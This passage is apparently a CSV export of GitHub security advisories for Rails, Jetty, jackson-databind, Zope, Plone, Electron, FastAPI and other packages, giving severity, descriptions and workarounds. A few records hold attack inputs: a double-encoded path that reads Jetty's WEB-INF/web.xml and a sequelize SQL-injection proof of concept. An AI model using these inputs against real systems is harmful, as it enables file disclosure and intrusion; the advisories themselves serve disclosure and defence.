With some knowledge of a target application it is possible for an attacker to 
guess the automatically generated development mode secret token.  This secret 
token can be used in combination with other Rails internals to escalate to a 
remote code execution exploit. 

All users running an affected release should either upgrade or use one of the 
workarounds immediately. 

Releases 
-------- 
The 6.0.0.beta3 and 5.2.2.1 releases are available at the normal locations. 

Workarounds 
----------- 
This issue can be mitigated by specifying a secret key in development mode. 
In ""config/environments/development.rb"" add this: 

```
  config.secret_key_base = SecureRandom.hex(64) 
```

Please note that only the 5.2.x, 5.1.x, 5.0.x, and 4.2.x series are supported 
at present. Users of earlier unsupported releases are advised to upgrade as 
soon as possible as we cannot guarantee the continued availability of security 
fixes for unsupported releases. 

Credits 
------- 
Thanks to ooooooo_q 
",rubygems
84,18817,activesupport,GHSA-vxvp-4xwc-jpp6,CVE-2015-3226,https://github.com/advisories/GHSA-vxvp-4xwc-jpp6,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects activesupport,Cross-site scripting (XSS) vulnerability in json/encoding.rb in Active Support in Ruby on Rails 3.x and 4.1.x before 4.1.11 and 4.2.x before 4.2.2 allows remote attackers to inject arbitrary web script or HTML via a crafted Hash that is mishandled during JSON encoding.,rubygems
85,30233,Zope2,GHSA-3qpr-7rmg-73v8,CVE-2012-5507,https://github.com/advisories/GHSA-3qpr-7rmg-73v8,moderate,2018-07-23 19:51:02 UTC,Moderate severity vulnerability that affects Plone and Zope2,"AccessControl/AuthEncoding.py in Zope before 2.13.19, as used in Plone before 4.2.3 and 4.3 before beta 1, allows remote attackers to obtain passwords via vectors involving timing discrepancies in password validation.",pip
86,30233,Zope2,GHSA-48vv-2pmq-9fvv,CVE-2012-6661,https://github.com/advisories/GHSA-48vv-2pmq-9fvv,moderate,2018-07-23 19:51:14 UTC,Moderate severity vulnerability that affects Plone and Zope2,"Zope before 2.13.19, as used in Plone before 4.2.3 and 4.3 before beta 1, does not reseed the pseudo-random number generator (PRNG), which makes it easier for remote attackers to guess the value via unspecified vectors.  NOTE: this issue was SPLIT from CVE-2012-5508 due to different vulnerability types (ADT2).",pip
87,18858,activemodel,GHSA-543v-gj2c-r3ch,CVE-2016-0753,https://github.com/advisories/GHSA-543v-gj2c-r3ch,moderate,2017-10-24 18:33:35 UTC,Moderate severity vulnerability that affects activemodel,"Active Model in Ruby on Rails 4.1.x before 4.1.14.1, 4.2.x before 4.2.5.1, and 5.x before 5.0.0.beta1.1 supports the use of instance-level writers for class accessors, which allows remote attackers to bypass intended validation steps via crafted parameters.",rubygems
88,33935,org.eclipse.jetty:jetty-server,GHSA-6x9x-8qw9-9pp6,CVE-2017-7658,https://github.com/advisories/GHSA-6x9x-8qw9-9pp6,critical,2018-10-19 16:16:38 UTC,Jetty vulnerable to authorization bypass due to inconsistent HTTP request handling (HTTP Request Smuggling),"Eclipse Jetty Server versions 9.2.x and older, 9.3.x (all non HTTP/1.x configurations), and 9.4.x (all HTTP/1.x configurations), are vulnerable to HTTP Request Smuggling when presented with two content-lengths headers, allowing authorization bypass. When presented with a content-length and a chunked encoding header, the content-length was ignored (as per RFC 2616). If an intermediary decides on the shorter length, but still passes on the longer body, then body content could be interpreted by Jetty as a pipelined request. If the intermediary is imposing authorization, the fake pipelined request bypasses that authorization.",maven
89,18865,actionpack,GHSA-78rc-8c29-p45g,CVE-2016-2098,https://github.com/advisories/GHSA-78rc-8c29-p45g,high,2017-10-24 18:33:35 UTC,High severity vulnerability that affects actionpack,"Action Pack in Ruby on Rails before 3.2.22.2, 4.x before 4.1.14.2, and 4.2.x before 4.2.5.2 allows remote attackers to execute arbitrary Ruby code by leveraging an application's unrestricted use of the render method.",rubygems
90,15554,OPCFoundation.NetStandard.Opc.Ua,GHSA-782p-53wq-cxmj,CVE-2018-12086,https://github.com/advisories/GHSA-782p-53wq-cxmj,high,2018-10-16 19:51:31 UTC,High severity vulnerability that affects OPCFoundation.NetStandard.Opc.Ua,Buffer overflow in OPC UA applications allows remote attackers to trigger a stack overflow with carefully structured requests.,nuget
91,27640,activestorage,GHSA-7rr7-rcjw-56vj,CVE-2018-16477,https://github.com/advisories/GHSA-7rr7-rcjw-56vj,moderate,2018-12-05 17:17:02 UTC,Exposure of Sensitive Information to an Unauthorized Actor in activestorage,"A bypass vulnerability in Active Storage >= 5.2.0 for Google Cloud Storage and Disk services allow an attacker to modify the `content-disposition` and `content-type` parameters which can be used in with HTML files and have them executed inline. Additionally, if combined with other techniques such as cookie bombing and specially crafted AppCache manifests, an attacker can gain access to private signed URLs within a specific storage path.",rubygems
92,33935,org.eclipse.jetty:jetty-server,GHSA-84q7-p226-4x5w,CVE-2017-7656,https://github.com/advisories/GHSA-84q7-p226-4x5w,high,2018-10-19 16:16:27 UTC,Jetty vulnerable to cache poisoning due to inconsistent HTTP request handling (HTTP Request Smuggling),"Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x (non-default configuration with RFC2616 compliance enabled), contain an HTTP Request Smuggling Vulnerability that can result in cache poisoning.",maven
93,30233,Zope2,GHSA-879r-7f3w-8jj3,CVE-2012-5489,https://github.com/advisories/GHSA-879r-7f3w-8jj3,moderate,2018-07-23 19:52:06 UTC,Moderate severity vulnerability that affects Plone and Zope2,"The App.Undo.UndoSupport.get_request_var_or_attr function in Zope before 2.12.21 and 3.13.x before 2.13.11, as used in Plone before 4.2.3 and 4.3 before beta 1, allows remote authenticated users to gain access to restricted attributes via unspecified vectors.",pip
94,18865,actionpack,GHSA-9h6g-gp95-x3q5,CVE-2015-7581,https://github.com/advisories/GHSA-9h6g-gp95-x3q5,high,2017-10-24 18:33:36 UTC,actionpack is vulnerable to denial of service because of a wildcard controller route,actionpack/lib/action_dispatch/routing/route_set.rb in Action Pack in Ruby on Rails 4.x before 4.2.5.1 and 5.x before 5.0.0.beta1.1 allows remote attackers to cause a denial of service (superfluous caching and memory consumption) by leveraging an application's use of a wildcard controller route.,rubygems
95,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-9mxf-g3x6-wv74,CVE-2018-14721,https://github.com/advisories/GHSA-9mxf-g3x6-wv74,critical,2019-01-04 19:07:06 UTC,Server-Side Request Forgery (SSRF) in jackson-databind,FasterXML jackson-databind 2.x before 2.9.7 might allow remote attackers to conduct server-side request forgery (SSRF) attacks by leveraging failure to block the axis2-jaxws class from polymorphic deserialization.,maven
96,33935,org.eclipse.jetty:jetty-server,GHSA-9rgv-h7x4-qw8g,CVE-2018-12536,https://github.com/advisories/GHSA-9rgv-h7x4-qw8g,moderate,2018-10-19 16:15:56 UTC,Moderate severity vulnerability that affects org.eclipse.jetty:jetty-server,"In Eclipse Jetty Server, all 9.x versions, on webapps deployed using default Error Handling, when an intentionally bad query arrives that doesn't match a dynamic url-pattern, and is eventually handled by the DefaultServlet's static file serving, the bad characters can trigger a java.nio.file.InvalidPathException which includes the full path to the base resource directory that the DefaultServlet and/or webapp is using. If this InvalidPathException is then handled by the default Error Handler, the InvalidPathException message is included in the error response, revealing the full server path to the requesting system.",maven
97,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-c8hm-7hpq-7jhg,CVE-2018-19362,https://github.com/advisories/GHSA-c8hm-7hpq-7jhg,high,2019-01-04 19:07:03 UTC,High severity vulnerability that affects com.fasterxml.jackson.core:jackson-databind,FasterXML jackson-databind 2.x before 2.9.8 might allow attackers to have unspecified impact by leveraging failure to block the jboss-common-core class from polymorphic deserialization.,maven
98,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-cggj-fvv3-cqwv,CVE-2018-7489,https://github.com/advisories/GHSA-cggj-fvv3-cqwv,critical,2018-10-16 17:45:18 UTC,FasterXML jackson-databind allows unauthenticated remote code execution,"FasterXML jackson-databind before 2.8.11.1 and 2.9.x before 2.9.5 allows unauthenticated remote code execution because of an incomplete fix for the CVE-2017-7525 deserialization flaw. This is exploitable by sending maliciously crafted JSON input to the readValue method of the ObjectMapper, bypassing a blacklist that is ineffective if the c3p0 libraries are available in the classpath.",maven
99,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-f9hv-mg5h-xcw9,CVE-2018-19360,https://github.com/advisories/GHSA-f9hv-mg5h-xcw9,critical,2019-01-04 19:06:57 UTC,Deserialization of Untrusted Data in jackson-databind due to polymorphic deserialization,FasterXML jackson-databind 2.x before 2.9.8 might allow attackers to have unspecified impact by leveraging failure to block the axis2-transport-jms class from polymorphic deserialization.,maven
100,18865,actionpack,GHSA-ffpv-c4hm-3x6v,CVE-2016-0751,https://github.com/advisories/GHSA-ffpv-c4hm-3x6v,high,2017-10-24 18:33:35 UTC,actionpack is vulnerable to denial of service via a crafted HTTP Accept header,"actionpack/lib/action_dispatch/http/mime_type.rb in Action Pack in Ruby on Rails before 3.2.22.1, 4.0.x and 4.1.x before 4.1.14.1, 4.2.x before 4.2.5.1, and 5.x before 5.0.0.beta1.1 does not properly restrict use of the MIME type cache, which allows remote attackers to cause a denial of service (memory consumption) via a crafted HTTP Accept header.",rubygems
101,16343,electron,GHSA-fjqr-fx3f-g4rv,CVE-2018-1000118,https://github.com/advisories/GHSA-fjqr-fx3f-g4rv,high,2018-03-26 16:41:20 UTC,Electron protocol handler browser vulnerable to Command Injection,"Github Electron version Electron 1.8.2-beta.4 and earlier contains a Command Injection vulnerability in Protocol Handler that can result in command execute. This attack appear to be exploitable via the victim opening an electron protocol handler in their browser. This vulnerability appears to have been fixed in Electron 1.8.2-beta.5. This issue is due to an incomplete fix for CVE-2018-1000006, specifically the black list used was not case insensitive allowing an attacker to potentially bypass it.",npm
102,33935,org.eclipse.jetty:jetty-server,GHSA-ghgj-3xqr-6jfm,CVE-2015-2080,https://github.com/advisories/GHSA-ghgj-3xqr-6jfm,high,2018-11-09 17:50:00 UTC,Jetty vulnerable to exposure of sensitive information to unauthenticated remote users,"The exception handling code in Eclipse Jetty prior to 9.2.9.v20150224 allows remote attackers to obtain sensitive information from process memory via illegal characters in an HTTP header, aka JetLeak.",maven
103,15554,OPCFoundation.NetStandard.Opc.Ua,GHSA-gr4c-5rq6-cgh3,CVE-2018-7559,https://github.com/advisories/GHSA-gr4c-5rq6-cgh3,moderate,2018-10-16 19:58:42 UTC,OPC UA applications can allow a remote attacker to determine a Server's private key,"An issue was discovered in OPC UA .NET Standard Stack and Sample Code before GitHub commit 2018-04-12, and OPC UA .NET Legacy Stack and Sample Code before GitHub commit 2018-03-13. A vulnerability in OPC UA applications can allow a remote attacker to determine a Server's private key by sending carefully constructed bad UserIdentityTokens as part of an oracle attack.",nuget
104,33935,org.eclipse.jetty:jetty-server,GHSA-h2f4-v4c4-6wx4,CVE-2018-12545,https://github.com/advisories/GHSA-h2f4-v4c4-6wx4,high,2019-03-28 18:33:38 UTC,Uncontrolled Resource Consumption in org.eclipse.jetty:jetty-server,"In Eclipse Jetty version 9.3.x and 9.4.x, the server is vulnerable to Denial of Service conditions if a remote client sends either large SETTINGs frames container containing many settings, or many small SETTINGs frames. The vulnerability is due to the additional CPU and memory allocations required to handle changed settings.",maven
105,34974,org.apache.struts:struts2-core,GHSA-j77q-2qqg-6989,CVE-2017-5638,https://github.com/advisories/GHSA-j77q-2qqg-6989,critical,2018-10-18 19:24:26 UTC,Apache Struts vulnerable to remote arbitrary command execution due to improper input validation,"Apache Struts versions prior to 2.3.32 and 2.5.10.1 contain incorrect exception handling and error-message generation during file-upload attempts using the Jakarta Multipart parser, which allows remote attackers to execute arbitrary commands via a crafted Content-Type, Content-Disposition, or Content-Length HTTP header, as exploited in the wild in March 2017 with a Content-Type header containing a #cmd= string.",maven
106,18823,nokogiri,GHSA-jxjr-5h69-qw3w,CVE-2015-7499,https://github.com/advisories/GHSA-jxjr-5h69-qw3w,moderate,2018-09-17 21:57:38 UTC,Moderate severity vulnerability that affects nokogiri,Heap-based buffer overflow in the xmlGROW function in parser.c in libxml2 before 2.9.3 allows context-dependent attackers to obtain sensitive process memory information via unspecified vectors.,rubygems
107,19060,actionview,GHSA-m63j-wh5w-c252,CVE-2019-5419,https://github.com/advisories/GHSA-m63j-wh5w-c252,critical,2019-03-13 17:25:55 UTC,Critical severity vulnerability that affects actionview,"# Denial of Service Vulnerability in Action View

Impact 
------ 
Specially crafted accept headers can cause the Action View template location 
code to consume 100% CPU, causing the server unable to process requests.  This 
impacts all Rails applications that render views. 

All users running an affected release should either upgrade or use one of the 
workarounds immediately. 

Releases 
-------- 
The 6.0.0.beta3, 5.2.2.1, 5.1.6.2, 5.0.7.2, and 4.2.11.1 releases are 
available at the normal locations. 

Workarounds 
----------- 
This vulnerability can be mitigated by wrapping `render` calls with 
`respond_to` blocks.  For example, the following example is vulnerable: 

``` 
class UserController < ApplicationController 
  def index 
    render ""index"" 
  end 
end 
``` 

But the following code is not vulnerable: 

``` 
class UserController < ApplicationController 
  def index 
    respond_to |format| 
      format.html { render ""index"" } 
    end 
  end 
end 
``` 

Implicit rendering is impacted, so this code is vulnerable: 

``` 
class UserController < ApplicationController 
  def index 
  end 
end 
``` 

But can be changed this this: 

``` 
class UserController < ApplicationController 
  def index 
    respond_to |format| 
      format.html { render ""index"" } 
    end 
  end 
end 
``` 

Alternatively to specifying the format, the following monkey patch can be 
applied in an initializer: 

``` 
$ cat config/initializers/formats_filter.rb 
# frozen_string_literal: true 

ActionDispatch::Request.prepend(Module.new do 
  def formats 
    super().select do |format| 
      format.symbol || format.ref == ""*/*"" 
    end 
  end 
end) 
``` 

Please note that only the 5.2.x, 5.1.x, 5.0.x, and 4.2.x series are supported 
at present. Users of earlier unsupported releases are advised to upgrade as 
soon as possible as we cannot guarantee the continued availability of security 
fixes for unsupported releases. 

Also note that the patches for this vulnerability are the same as CVE-2019-5418. 

Credits 
------- 
Thanks to John Hawthorn <john@hawthorn.email> of GitHub ",rubygems
108,33935,org.eclipse.jetty:jetty-server,GHSA-mwcx-532g-8pq3,CVE-2018-12538,https://github.com/advisories/GHSA-mwcx-532g-8pq3,high,2018-10-16 17:44:11 UTC,Access and integrity issue within Eclipse Jetty,"In Eclipse Jetty versions 9.4.0 through 9.4.8, when using the optional Jetty provided FileSessionDataStore for persistent storage of HttpSession details, it is possible for a malicious user to access/hijack other HttpSessions and even delete unmatched HttpSessions present in the FileSystem's storage for the FileSessionDataStore.",maven
109,20276,Plone,GHSA-p5wr-vp8g-q5p4,CVE-2017-5524,https://github.com/advisories/GHSA-p5wr-vp8g-q5p4,moderate,2018-07-12 14:45:15 UTC,Moderate severity vulnerability that affects Plone,Plone 4.x through 4.3.11 and 5.x through 5.0.6 allow remote attackers to bypass a sandbox protection mechanism and obtain sensitive information by leveraging the Python string format method.,pip
110,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-mx9v-gmh4-mgqw,CVE-2018-19361,https://github.com/advisories/GHSA-mx9v-gmh4-mgqw,critical,2019-01-04 19:07:01 UTC,Deserialization of Untrusted Data in jackson-databind,FasterXML jackson-databind 2.x before 2.9.8 might allow attackers to have unspecified impact by leveraging failure to block the openjpa class from polymorphic deserialization.,maven
111,18865,actionpack,GHSA-p692-7mm3-3fxg,CVE-2015-7576,https://github.com/advisories/GHSA-p692-7mm3-3fxg,low,2017-10-24 18:33:36 UTC,actionpack is vulnerable to remote bypass authentication,"The http_basic_authenticate_with method in actionpack/lib/action_controller/metal/http_authentication.rb in the Basic Authentication implementation in Action Controller in Ruby on Rails before 3.2.22.1, 4.0.x and 4.1.x before 4.1.14.1, 4.2.x before 4.2.5.1, and 5.x before 5.0.0.beta1.1 does not use a constant-time algorithm for verifying credentials, which makes it easier for remote attackers to bypass authentication by measuring timing differences.",rubygems
112,34791,org.apache.hbase:hbase,GHSA-p8xr-4v2c-rvgp,CVE-2015-1836,https://github.com/advisories/GHSA-p8xr-4v2c-rvgp,high,2018-10-18 18:04:50 UTC,High severity vulnerability that affects org.apache.hbase:hbase,"Apache HBase 0.98 before 0.98.12.1, 1.0 before 1.0.1.1, and 1.1 before 1.1.0.1, as used in IBM InfoSphere BigInsights 3.0, 3.0.0.1, and 3.0.0.2 and other products, uses incorrect ACLs for ZooKeeper coordination state, which allows remote attackers to cause a denial of service (daemon outage), obtain sensitive information, or modify data via unspecified client traffic.",maven
113,20306,Products.CMFPlone,GHSA-p7h9-vf92-5fj5,CVE-2011-1948,https://github.com/advisories/GHSA-p7h9-vf92-5fj5,moderate,2018-07-23 19:50:57 UTC,Moderate severity vulnerability that affects Products.CMFPlone and Products.PasswordResetTool,Cross-site scripting (XSS) vulnerability in Plone 4.1 and earlier allows remote attackers to inject arbitrary web script or HTML via a crafted URL.,pip
114,18828,activerecord,GHSA-pr3r-4wrp-r2pv,CVE-2016-6317,https://github.com/advisories/GHSA-pr3r-4wrp-r2pv,high,2017-10-24 18:33:35 UTC,ActiveRecord in Ruby on Rails allows database-query bypass,"Action Record in Ruby on Rails 4.2.x before 4.2.7.1 does not properly consider differences in parameter handling between the Active Record component and the JSON implementation, which allows remote attackers to bypass intended database-query restrictions and perform NULL checks or trigger missing WHERE clauses via a crafted request, as demonstrated by certain ""[nil]"" values, a related issue to CVE-2012-2660, CVE-2012-2694, and CVE-2013-0155.",rubygems
115,20276,Plone,GHSA-prr5-pfr8-q9f3,CVE-2012-5503,https://github.com/advisories/GHSA-prr5-pfr8-q9f3,moderate,2018-07-23 19:52:35 UTC,Moderate severity vulnerability that affects Plone,ftp.py in Plone before 4.2.3 and 4.3 before beta 1 allows remote attackers to read hidden folder contents via unspecified vectors.,pip
116,19166,activejob,GHSA-q2qw-rmrh-vv42,CVE-2018-16476,https://github.com/advisories/GHSA-q2qw-rmrh-vv42,high,2018-12-05 17:24:27 UTC,Improper Access Control in activejob,A Broken Access Control vulnerability in Active Job versions >= 4.2.0 allows an attacker to craft user input which can cause Active Job to deserialize it using GlobalId and give them access to information that they should not have.,rubygems
117,19246,newrelic_rpm,GHSA-q6cw-2553-7837,CVE-2013-0284,https://github.com/advisories/GHSA-q6cw-2553-7837,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects newrelic_rpm,"Ruby agent 3.2.0 through 3.5.2 serializes sensitive data when communicating with servers operated by New Relic, which allows remote attackers to obtain sensitive information (database credentials and SQL statements) by sniffing the network and deserializing the data.",rubygems
118,18823,nokogiri,GHSA-q7wx-62r7-j2x7,CVE-2015-1819,https://github.com/advisories/GHSA-q7wx-62r7-j2x7,moderate,2018-08-08 22:31:12 UTC,Moderate severity vulnerability that affects nokogiri,"The xmlreader in libxml allows remote attackers to cause a denial of service (memory consumption) via crafted XML data, related to an XML Entity Expansion (XEE) attack.",rubygems
119,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-qxxx-2pp7-5hmx,CVE-2017-7525,https://github.com/advisories/GHSA-qxxx-2pp7-5hmx,critical,2018-10-16 17:21:35 UTC,A deserialization flaw was discovered in the jackson-databind,"A deserialization flaw was discovered in the jackson-databind, versions before 2.6.7.1, 2.7.9.1 and 2.8.9, which could allow an unauthenticated user to perform code execution by sending the maliciously crafted input to the readValue method of the ObjectMapper.",maven
120,35118,org.springframework.security.oauth:spring-security-oauth2,GHSA-rrpm-pj7p-7j9q,CVE-2018-1260,https://github.com/advisories/GHSA-rrpm-pj7p-7j9q,critical,2018-10-18 18:05:34 UTC,Spring Security OAuth vulnerable to remote code execution (RCE),"Spring Security OAuth versions prior to 2.3.3,prior to 2.2.2, prior to 2.1.2,  and prior to 2.0.15 contain a remote code execution vulnerability. An attacker can craft an authorization request to the authorization endpoint that can lead to remote code execution when the resource owner is forwarded to the approval endpoint. ",maven
121,33935,org.eclipse.jetty:jetty-server,GHSA-vgg8-72f2-qm23,CVE-2017-7657,https://github.com/advisories/GHSA-vgg8-72f2-qm23,critical,2018-10-19 16:15:34 UTC,Critical severity vulnerability that affects org.eclipse.jetty:jetty-server,"In Eclipse Jetty, versions 9.2.x and older, 9.3.x, transfer-encoding chunks are handled poorly. The chunk length parsing was vulnerable to an integer overflow. Thus a large chunk size could be interpreted as a smaller chunk size and content sent as chunk body could be interpreted as a pipelined request. If Jetty was deployed behind an intermediary that imposed some authorization and that intermediary allowed arbitrarily large chunks to be passed on unchanged, then this flaw could be used to bypass the authorization imposed by the intermediary as the fake pipelined request would not be interpreted by the intermediary as a request.",maven
122,19060,actionview,GHSA-vx9j-46rh-fqr8,CVE-2016-2097,https://github.com/advisories/GHSA-vx9j-46rh-fqr8,moderate,2017-10-24 18:33:35 UTC,Moderate severity vulnerability that affects actionview,Directory traversal vulnerability in Action View in Ruby on Rails before 3.2.22.2 and 4.x before 4.1.14.2 allows remote attackers to read arbitrary files by leveraging an application's unrestricted use of the render method and providing a .. (dot dot) in a pathname.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2016-0752.,rubygems
123,16343,electron,GHSA-w222-53c6-c86p,CVE-2018-1000006,https://github.com/advisories/GHSA-w222-53c6-c86p,high,2018-01-23 03:57:44 UTC,Remote Code Execution in electron,"Affected versions of `electron` may be susceptible to a remote code execution flaw when certain conditions are met:
1. The electron application is running on Windows.
2. The electron application registers as the default handler for a protocol, such as `nodeapp://`.

This vulnerability is caused by a failure to sanitize additional arguments to chromium in the command line handler for Electron.

MacOS and Linux are not vulnerable.


## Recommendation

Update electron to a version that is not vulnerable. If updating is not possible, the electron team has provided the following guidance:


If for some reason you are unable to upgrade your Electron version, you can append `--` as the last argument when calling `app.setAsDefaultProtocolClient`, which prevents Chromium from parsing further options. The double dash `--` signifies the end of command options, after which only positional parameters are accepted.
```
app.setAsDefaultProtocolClient(protocol, process.execPath, [
  '--your-switches-here',
  '--'
])
```",npm
124,33935,org.eclipse.jetty:jetty-server,GHSA-wfcc-pff6-rgc5,CVE-2017-9735,https://github.com/advisories/GHSA-wfcc-pff6-rgc5,high,2018-10-19 16:15:46 UTC,Jetty vulnerable to exposure of sensitive information due to observable discrepancy,"Jetty through 9.4.x contains a timing channel attack in util/security/Password.java, which allows attackers to obtain access by observing elapsed times before rejection of incorrect passwords.",maven
125,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-x2w5-5m2g-7h5m,CVE-2018-14720,https://github.com/advisories/GHSA-x2w5-5m2g-7h5m,critical,2019-01-04 19:09:46 UTC,XML External Entity Reference (XXE) in jackson-databind,FasterXML jackson-databind 2.x before 2.9.7 might allow attackers to conduct external XML entity (XXE) attacks by leveraging failure to block unspecified JDK classes from polymorphic deserialization.,maven
126,18823,nokogiri,GHSA-xjqg-9jvg-fgx2,CVE-2015-5312,https://github.com/advisories/GHSA-xjqg-9jvg-fgx2,high,2018-08-21 19:03:04 UTC,High severity vulnerability that affects nokogiri,"The xmlStringLenDecodeEntities function in parser.c in libxml2 before 2.9.3 (as used in nokogiri before 1.6.7.1) does not properly prevent entity expansion, which allows context-dependent attackers to cause a denial of service (CPU consumption) via crafted XML data, a different vulnerability than CVE-2014-3660.",rubygems
127,16330,sequelize,GHSA-xqg8-cv3h-xppv,CVE-2015-1369,https://github.com/advisories/GHSA-xqg8-cv3h-xppv,high,2017-10-24 18:33:36 UTC,SQL Injection in sequelize,"Versions 2.0.0-rc-7 and earlier of `sequelize` are affected by a SQL injection vulnerability when user input is passed into the order parameter.



## Proof of Concept

```javascript
Test.findAndCountAll({
where: { id :1 },
order : [['id', 'UNTRUSTED USER INPUT']]
})
```


## Recommendation

Update to version 2.0.0-rc8 or later",npm
128,18828,activerecord,GHSA-xrr6-3pc4-m447,CVE-2015-7577,https://github.com/advisories/GHSA-xrr6-3pc4-m447,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects activerecord,"activerecord/lib/active_record/nested_attributes.rb in Active Record in Ruby on Rails 3.1.x and 3.2.x before 3.2.22.1, 4.0.x and 4.1.x before 4.1.14.1, 4.2.x before 4.2.5.1, and 5.x before 5.0.0.beta1.1 does not properly implement a certain destroy option, which allows remote attackers to bypass intended change restrictions by leveraging use of the nested attributes feature.",rubygems
129,19060,actionview,GHSA-xrr4-p6fq-hjg7,CVE-2016-0752,https://github.com/advisories/GHSA-xrr4-p6fq-hjg7,high,2017-10-24 18:33:35 UTC,Directory traversal vulnerability in Action View in Ruby on Rails,"Directory traversal vulnerability in Action View in Ruby on Rails before 3.2.22.1, 4.0.x and 4.1.x before 4.1.14.1, 4.2.x before 4.2.5.1, and 5.x before 5.0.0.beta1.1 allows remote attackers to read arbitrary files by leveraging an application's unrestricted use of the render method and providing a .. (dot dot) in a pathname.",rubygems
130,19951,websockets,GHSA-8ch4-58qp-g3mp,CVE-2021-33880,https://github.com/advisories/GHSA-8ch4-58qp-g3mp,moderate,2021-06-11 17:43:14 UTC,Observable Timing Discrepancy in aaugustin websockets library,The aaugustin websockets library before 9.1 for Python has an Observable Timing Discrepancy on servers when HTTP Basic Authentication is enabled with basic_auth_protocol_factory(credentials=...). An attacker may be able to guess a password via a timing attack.,pip
131,33872,com.google.guava:guava,GHSA-mvr2-9pj6-7w5j,CVE-2018-10237,https://github.com/advisories/GHSA-mvr2-9pj6-7w5j,moderate,2020-06-15 20:35:11 UTC,Denial of Service in Google Guava,"Unbounded memory allocation in Google Guava 11.0 through 24.x before 24.1.1 allows remote attackers to conduct denial of service attacks against servers that depend on this library and deserialize attacker-provided data, because the AtomicDoubleArray class (when serialized with Java serialization) and the CompoundOrdering class (when serialized with GWT serialization) perform eager allocation without appropriate checks on what a client has sent and whether the data size is reasonable.",maven
132,30537,Zope,GHSA-5vq5-pg3r-9ph3,CVE-2021-32674,https://github.com/advisories/GHSA-5vq5-pg3r-9ph3,high,2021-06-10 17:22:08 UTC,Path Traversal in Zope,"Zope is an open-source web application server. This advisory extends the previous advisory at https://github.com/zopefoundation/Zope/security/advisories/GHSA-5pr9-v234-jw36 with additional cases of TAL expression traversal vulnerabilities. Most Python modules are not available for using in TAL expressions that you can add through-the-web, for example in Zope Page Templates. This restriction avoids file system access, for example via the 'os' module. But some of the untrusted modules are available indirectly through Python modules that are available for direct use. By default, you need to have the Manager role to add or edit Zope Page Templates through the web. Only sites that allow untrusted users to add/edit Zope Page Templates through the web are at risk. The problem has been fixed in Zope 5.2.1 and 4.6.1. The workaround is the same as for https://github.com/zopefoundation/Zope/security/advisories/GHSA-5pr9-v234-jw36: A site administrator can restrict adding/editing Zope Page Templates through the web using the standard Zope user/role permission mechanisms. Untrusted users should not be assigned the Zope Manager role and adding/editing Zope Page Templates through the web should be restricted to trusted users only.",pip
133,29107,datasette,GHSA-gff3-739c-gxfq,CVE-2021-32670,https://github.com/advisories/GHSA-gff3-739c-gxfq,high,2021-06-10 17:22:59 UTC,Reflected cross-site scripting issue in Datasette,"Datasette is an open source multi-tool for exploring and publishing data. The `?_trace=1` debugging feature in Datasette does not correctly escape generated HTML, resulting in a [reflected cross-site scripting](https://owasp.org/www-community/attacks/xss/#reflected-xss-attacks) vulnerability. This vulnerability is particularly relevant if your Datasette installation includes authenticated features using plugins such as [datasette-auth-passwords](https://datasette.io/plugins/datasette-auth-passwords) as an attacker could use the vulnerability to access protected data. Datasette 0.57 and 0.56.1 both include patches for this issue. If you run Datasette behind a proxy you can workaround this issue by rejecting any incoming requests with `?_trace=` or `&_trace=` in their query string parameters.",pip
134,34233,org.eclipse.jetty:jetty-servlets,GHSA-gwcr-j4wh-j3cq,CVE-2021-28169,https://github.com/advisories/GHSA-gwcr-j4wh-j3cq,moderate,2021-06-10 15:43:22 UTC,Jetty Utility Servlets ConcatServlet Double Decoding Information Disclosure Vulnerability,"Requests to the `ConcatServlet` and `WelcomeFilter` are able to access protected resources within the `WEB-INF` directory. For example a request to the `ConcatServlet` with a URI of `/concat?/%2557EB-INF/web.xml` can retrieve the web.xml file. This can reveal sensitive information regarding the implementation of a web application.

This occurs because both `ConcatServlet` and `WelcomeFilter` decode the supplied path to verify it is not within the `WEB-INF` or `META-INF` directories. It then uses this decoded path to call `RequestDispatcher` which will also do decoding of the path. This double decoding allows paths with a doubly encoded `WEB-INF` to bypass this security check.

### Impact
This affects all versions of `ConcatServlet` and `WelcomeFilter` in versions before 9.4.41, 10.0.3 and 11.0.3.

### Workarounds

If you cannot update to the latest version of Jetty, you can instead deploy your own version of the [`ConcatServlet`](https://github.com/eclipse/jetty.project/blob/4204526d2fdad355e233f6bf18a44bfe028ee00b/jetty-servlets/src/main/java/org/eclipse/jetty/servlets/ConcatServlet.java) and/or the [`WelcomeFilter`](https://github.com/eclipse/jetty.project/blob/4204526d2fdad355e233f6bf18a44bfe028ee00b/jetty-servlets/src/main/java/org/eclipse/jetty/servlets/WelcomeFilter.java) by using the code from the latest version of Jetty.
",maven
135,20520,fastapi,GHSA-8h2j-cgx8-6xv7,CVE-2021-32677,https://github.com/advisories/GHSA-8h2j-cgx8-6xv7,high,2021-06-10 15:43:54 UTC,Cross-Site Request Forgery (CSRF) in FastAPI,"### Impact

FastAPI versions lower than `0.65.2` that used cookies for authentication in path operations that received JSON payloads sent by browsers were vulnerable to a Cross-Site Request Forgery (CSRF) attack.

In versions lower than `0.65.2`, FastAPI would try to read the request payload as JSON even if the `content-type` header sent was not set to `application/json` or a compatible JSON media type (e.g. `application/geo+json`).

So, a request with a content type of `text/plain` containing JSON data would be accepted and the JSON data would be extracted.

But requests with content type `text/plain` are exempt from [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) preflights, for being considered [Simple requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests). So, the browser would execute them right away including cookies, and the text content could be a JSON string that would be parsed and accepted by the FastAPI application.

### Patches

This is fixed in FastAPI `0.65.2`.

The request data is now parsed as JSON only if the `content-type` header is `application/json` or another JSON compatible media type like `application/geo+json`.

### Workarounds

It's best to upgrade to the latest FastAPI.

But still, it would be possible to add a middleware or a dependency that checks the `content-type` header and aborts the request if it is not `application/json` or another JSON compatible content type.

### References

* [CORS on Mozilla web docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
